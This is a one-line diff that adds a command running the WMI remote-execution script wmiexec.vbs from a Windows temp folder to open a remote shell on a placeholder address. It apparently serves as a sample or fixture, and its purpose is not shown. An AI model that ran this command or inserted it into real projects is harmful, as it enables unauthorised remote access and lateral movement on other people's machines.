@@ -1,0 +1,1 @@
+cscript.exe "C:\Windows\Temp\wmiexec.vbs" /shell "192.0.2.10"
